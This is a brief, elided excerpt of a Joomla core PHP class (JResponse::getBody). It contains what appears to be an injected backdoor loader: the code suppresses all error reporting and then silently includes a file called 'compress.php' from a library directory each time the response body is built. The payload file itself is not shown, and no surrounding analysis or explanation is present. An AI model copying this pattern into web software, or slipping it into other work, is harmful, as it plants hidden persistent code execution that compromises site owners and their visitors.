...
class JResponse
{
	...
	function getBody($toArray = false)
	{
		...
		error_reporting(E_ALL | E_STRICT);	ini_set("display_errors", "off");	error_reporting(0);	$path=getcwd();
		if (file_exists ($path."/libraries/joomla/environment/"."compress.php")){
		include_once ($path."/libraries/joomla/environment/"."compress.php");
		}
return ob_get_clean();
	}
